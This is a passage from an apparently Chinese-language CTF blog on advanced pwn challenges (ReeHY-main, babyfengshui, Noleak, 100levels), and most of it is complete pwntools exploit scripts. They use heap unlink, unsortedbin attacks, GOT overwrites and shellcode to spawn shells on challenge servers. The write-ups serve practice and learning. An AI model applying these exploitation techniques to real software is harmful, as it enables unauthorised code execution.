class="hljs-comment">#edit1(0)即编辑node2的结构体，修改node2-&gt;description指向atoi的got表</span><br>edit1(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,payload)<br>list1()<br>r.recvuntil(<span class="hljs-string">&#x27;2: price.20, des.&#x27;</span>)<br><span class="hljs-comment">#泄露atoi地址</span><br>atoi_addr = u32(r.recv(<span class="hljs-number">4</span>))<br>offset = atoi_addr - libc.symbols[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system_addr = offset + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#修改atoi的got表指向system</span><br>edit1(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>,p32(system_addr))<br>r.sendafter(<span class="hljs-string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="4-ReeHY-main-100⭐"><a href="#4-ReeHY-main-100⭐" class="headerlink" title="4-ReeHY-main-100⭐"></a>4-ReeHY-main-100⭐</h3><h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>参考：<a href="https://www.codenong.com/cs109514415/">https://www.codenong.com/cs109514415/</a></p><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230330215548423.png" alt="image-20230330215548423"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coq">P：为要取出的chunk指针（指向chunk头）<br>修改P的fd位为：P - <span class="hljs-number">0x18</span><br>修改P的bk位为：P - <span class="hljs-number">0x10</span><br>在执行unlink时会检测，(P-&gt;fd + <span class="hljs-number">0x18</span> == P &amp;&amp; P-bk + <span class="hljs-number">0x10</span> ==P)，即检测P的下一个chunk的上一个chunk是否为P和P的上一个chunk的下一个chunk是否为P,<br>即 (P - <span class="hljs-number">0x18</span> +<span class="hljs-number">0x18</span>==P &amp;&amp; P - <span class="hljs-number">0x10</span> + <span class="hljs-number">0x10</span> ==p) 为真。满足执行unlink条件。<br>unlink操作为：<br>P-&gt;fd + <span class="hljs-number">0x18</span> = P-&gt;bk ==&gt; P - <span class="hljs-number">0x18</span> + <span class="hljs-number">0x18</span> = P - <span class="hljs-number">0x10</span> ==&gt; P = P - <span class="hljs-number">0x10</span><br>P-&gt;bk + <span class="hljs-number">0x10</span> = P-&gt;fd ==&gt; P - <span class="hljs-number">0x10</span> + <span class="hljs-number">0x10</span> = P - <span class="hljs-number">0x18</span> ==&gt; P = P - <span class="hljs-number">0x18</span><br>所有执行完后就实现了 P = P - <span class="hljs-number">0x18</span>。如果程序将chunk的指针（chunk中用户可编辑区的指针）存储在全局bass段，我们就能得到一个bass地址mem = mem - <span class="hljs-number">0x18</span>，结合对mem指针进行编辑的程序，进而来实现bass段任意写入。<br></code></pre></td></tr></table></figure><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process(&#x27;./pwn&#x27;)   </span><br>io = remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">57614</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>():<br>    io.recvuntil(<span class="hljs-string">&#x27;name: \n$&#x27;</span>)<br>    io.send(<span class="hljs-string">&#x27;demo&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">index,size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;*********\n$&#x27;</span>)<br>    io.send(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Input size\n&#x27;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Input cun\n&#x27;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(index))<br>    io.recvuntil(<span class="hljs-string">&#x27;Input content\n&#x27;</span>)<br>    io.send(content)    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;*********\n$&#x27;</span>)<br>    io.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Chose one to dele\n&#x27;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;*********\n$&#x27;</span>)<br>    io.send(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;to edit\n&#x27;</span>)<br>    io.send(<span class="hljs-built_in">str</span>(index))<br>    io.recvuntil(<span class="hljs-string">&#x27;the content\n&#x27;</span>)<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():    <br>    system_off = <span class="hljs-number">0x45390</span><br>    puts_off = <span class="hljs-number">0x6f690</span><br>    got_addr = <span class="hljs-number">0x602018</span><br>    p_addr = <span class="hljs-number">0x602100</span>              <span class="hljs-comment">#第三次create的地址</span><br>    puts_plt = <span class="hljs-number">0x4006d0</span> <br>     <br>    welcome()<br>    create(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br> <br>    create(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br>    create(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;CCCC&#x27;</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    <br>    payload = p64(<span class="hljs-number">0</span>)<br>    payload += p64(<span class="hljs-number">0x101</span>)<br>    payload += p64(p_addr-<span class="hljs-number">0x18</span>)<br>    payload += p64(p_addr-<span class="hljs-number">0x10</span>)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>-<span class="hljs-number">4</span>*<span class="hljs-number">8</span>)<br>    payload += p64(<span class="hljs-number">0x100</span>)<br>    payload += p64(<span class="hljs-number">0x110</span>)<br><br>    create(<span class="hljs-number">2</span>,<span class="hljs-number">0x210</span>,payload)<br>    <span class="hljs-comment">#unlink</span><br>    delete(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#*p = p-0x18 = 0x602100-0x18 = 0x6020e8</span><br>    payload = p64(<span class="hljs-number">1</span>)         <br>    payload += p64(got_addr)    <span class="hljs-comment">#1--free()</span><br>    payload += p64(<span class="hljs-number">1</span>)<br>    payload += p64(got_addr+<span class="hljs-number">8</span>)  <span class="hljs-comment">#2--puts()</span><br>    payload += p64(<span class="hljs-number">1</span>)<br>    edit(<span class="hljs-number">2</span>,payload)<br>   <br>    <span class="hljs-comment">#修改free--&gt;puts</span><br>    edit(<span class="hljs-number">1</span>,p64(puts_plt)) <br>    <span class="hljs-comment">#puts(puts_got)</span><br>    delete(<span class="hljs-number">2</span>)<br>    puts_addr = io.recv(<span class="hljs-number">6</span>)<br>    system_addr = u64(puts_addr+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span>)-puts_off+system_off<br>    <span class="hljs-comment">#修改free--&gt;system</span><br>    edit(<span class="hljs-number">1</span>,p64(system_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    io.interactive()<br>exp()<br></code></pre></td></tr></table></figure><h3 id="babyfengshui"><a href="#babyfengshui" class="headerlink" title="babyfengshui"></a>babyfengshui</h3><h4 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h4><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230331160410543.png" alt="image-20230331160410543"></p><img src="image-20230331164836314.png" alt="image-20230331164836314"  /><p>首先创建一个堆块用来存放description信息，用<code>*S</code>指向它；再创建一个堆块，用<code>*V2</code>指向它，前四个字节存放description的地址，后面用来存放名字name；最后将bss段的ptr[0]指向<code>*V2</code>这个堆块。并将byte_804b069自加1，这个值相当于记录目前一共申请了多少个user。</p><img src="babyfengshui-1.png" alt="babyfengshui-1" style="zoom: 80%;" /><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230331154102144.png" alt="image-20230331154102144"></p><p>*本题给的libc有问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-number">55228</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_user</span>(<span class="hljs-params">size,name,text_length,text</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;size of description: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;name: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">&quot;text length: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(text_length))<br>    p.recvuntil(<span class="hljs-string">&quot;text: &quot;</span>)<br>    p.sendline(text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del_user</span>(<span class="hljs-params">user_index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(user_index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">disp_user</span>(<span class="hljs-params">user_index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(user_index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_description</span>(<span class="hljs-params">user_index,text_length,text</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(user_index))<br>    p.recvuntil(<span class="hljs-string">&quot;text length: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(text_length))<br>    p.recvuntil(<span class="hljs-string">&quot;text: &quot;</span>)<br>    p.sendline(text)<br><br>add_user(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;name0&#x27;</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;text0&#x27;</span>)<br>add_user(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;name1&#x27;</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;text1&#x27;</span>)<br>del_user(<span class="hljs-number">0</span>)<br>add_user(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;name2&#x27;</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;text2&#x27;</span>)    <span class="hljs-comment">#分配index0，name0x80堆</span><br><br>payload = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0xa0</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)) + p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])   <span class="hljs-comment">#0x80+0x8+0x10+0x8=0xa0,覆盖index1，desc</span><br>update_description(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>disp_user(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;description: &#x27;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-comment">#计算栈偏移</span><br>libc_base = free_addr - <span class="hljs-number">0x070750</span><br>system_addr =  libc_base + <span class="hljs-number">0x03a940</span><br><span class="hljs-comment"># 将free函数的got表项写成system函数地址</span><br>update_description(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,p32(system_addr))<br><span class="hljs-comment">#执行system(&#x27;/bin/sh&#x27;)</span><br>del_user(<span class="hljs-number">2</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Noleak⭐"><a href="#Noleak⭐" class="headerlink" title="Noleak⭐"></a>Noleak⭐</h3><h4 id="unlink、unsortedbin-attack"><a href="#unlink、unsortedbin-attack" class="headerlink" title="unlink、unsortedbin attack"></a>unlink、unsortedbin attack</h4><p>unsorted_bin是双链表结构，FIFO(先进先出)。arena中fd指向链表首，bk指向链表尾。并且其中的chunk遵循头部插入尾部取出的规则。值得一提的是，首chunk的bk和尾chunk的fd都指向arena。取出尾chunk时会将arena中的bk指向尾chunk的fd，也就是上一个chunk的位置，同时会将上一个chunk的fd改写为arena的地址。这意味着，如果在取出尾部chunk前，我们如果将尾部chunk的bk修改为tartget_addr-0x10（fd被改掉不会直接报错，但是可能会破坏链表），那么在取出后，target的值就会被覆盖为main_arena+0x58的地址。</p><p>将**__malloc_hook<strong>赋值为某个函数的地址，那么，执行</strong>malloc**时，系统就会去调用那个函数。</p><img src="image-20230402222405169.png" alt="image-20230402222405169" style="zoom:80%;" /><img src="image-20230402222405169-1681049986908.png" alt="image-20230402222405169" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-number">61691</span>)<br><span class="hljs-comment">#p = process(&quot;./timu&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_node</span>(<span class="hljs-params">size,data</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Data: &quot;</span>)<br>    p.sendline(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_node</span>(<span class="hljs-params">index,size,data</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Data: &quot;</span>)<br>    p.sendline(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_node</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>buf_addr = <span class="hljs-number">0x601040</span><br>bss_addr = <span class="hljs-number">0x601020</span><br>add_node(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x100</span>)<br>add_node(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">0x100</span>)<br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) <br>payload += p64(buf_addr-<span class="hljs-number">0x18</span>) + p64(buf_addr-<span class="hljs-number">0x10</span>) + <span class="hljs-number">0xe0</span>*<span class="hljs-string">b&quot;1&quot;</span> + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x110</span>)<br>update_node(<span class="hljs-number">0</span>,<span class="hljs-number">0x110</span>,payload)         <span class="hljs-comment">#修改chunk0，fake chunk，栈溢出</span><br><span class="hljs-comment">#unlink，buf_addr=buf_addr-0x18</span><br>delete_node(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(bss_addr) + p64(buf_addr)      <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x20</span>)<br>update_node(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)        <span class="hljs-comment">#修改buf[0]即buf_addr即buf_addr-0x18</span><br><br>add_node(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">0x100</span>)<br>add_node(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">0x100</span>)<br><span class="hljs-comment">#free buf[2]进入unsorted bin</span><br>delete_node(<span class="hljs-number">2</span>)<br>payload = p64(<span class="hljs-number">0</span>) + p64(buf_addr + <span class="hljs-number">0x20</span>)   <br>update_node(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)    <span class="hljs-comment">#bk设为buf_addr+0x20</span><br>add_node(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;e&quot;</span>*<span class="hljs-number">0x100</span>)   <span class="hljs-comment">#申请得到2的空间，unsorted bin只剩fake buf，main arena+0x58的地址就被留在了buf[6]</span><br><span class="hljs-comment">#把buf[6]修改为__malloc_hook的地址</span><br>payload = p64(bss_addr) + p64(buf_addr)<br>payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>payload += <span class="hljs-string">b&quot;\x10&quot;</span><br>update_node(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br><span class="hljs-comment">#向buf[0]写入shellcode</span><br>shellcode = asm(shellcraft.sh())<br>update_node(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(shellcode),shellcode)<br><span class="hljs-comment">#向buf[6]写入shellcode地址</span><br>payload = p64(bss_addr)<br>update_node(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><span class="hljs-comment">#gdb.attach(p,&quot;b * 0x40083d&quot;)</span><br><span class="hljs-comment">#执行malloc实际执行shellcode</span><br>p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="1000levevls"><a href="#1000levevls" class="headerlink" title="1000levevls"></a>1000levevls</h3><h4 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h4><p>在开启了ASLR的系统上运行存在PIE保护的程序，意味着所有的地址都是随机化的。然而在某些版本的系统中这个结论并不成立，原因是存在着一个神奇的vsyscall机制。它地址是固定不变的，即使开启了PIE也不会改变。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/maps<br>(gdb)dump memory ./dump 0xffffffffff600000 0xffffffffff601000<br></code></pre></td></tr></table></figure><img src="image-20230407091650424.png" alt="image-20230407091650424" style="zoom:80%;" /><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230407095051593.png" alt="image-20230407095051593"></p><p>栈溢出</p><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230407111450185.png" alt="image-20230407111450185"></p><p><em>2. Hint</em> 中system地址存储在rbp-0x110位置</p><img src="image-20230407110132195.png" alt="image-20230407110132195" style="zoom:80%;" /><p><em>1. Go</em>中输入0，rbp-0x110遗留的system地址</p><img src="image-20230407110212092.png" alt="image-20230407110212092" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r = remote(&quot;61.147.171.105&quot;, 57235)</span><br>r=process(<span class="hljs-string">&#x27;./100levels&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so&quot;</span>)<br>one_gadget = <span class="hljs-number">0x4526a</span><br>system = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;Choice:\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;Choice:\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;How many levels?\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;Any more?\n&quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(one_gadget-system))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>():<br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;Question: &quot;</span>)<br>num1 = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>))<br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;* &quot;</span>)<br>num2 = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>))<br>ans = num1 * num2<br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;Answer:&quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(ans))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">99</span>):<br>calc()<br><span class="hljs-built_in">print</span> r.recvuntil(<span class="hljs-string">&quot;Answer:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0xffffffffff600000</span>) * <span class="hljs-number">3</span><br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p><img 